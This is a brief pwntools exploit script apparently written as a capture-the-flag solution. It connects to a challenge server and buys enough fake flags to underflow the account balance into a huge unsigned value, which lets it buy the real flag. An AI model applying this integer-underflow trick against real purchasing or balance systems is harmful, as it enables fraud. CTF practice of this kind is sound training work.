from pwn import *

io = remote("challs.n00bzunit3d.xyz", 50267)

# buy lots of fake flag so your balance becomes negative(which is 0xfffffff something)
# greater than 1337 to by real flag

io.sendlineafter(b'balance', b'2')
io.sendlineafter(b'How many?', b'10')

io.sendlineafter(b'balance', b'1')
io.sendlineafter(b'How many?', b'1')
io.recvline()

info(f"flag is: {io.recvall().decode()}")

io.interactive()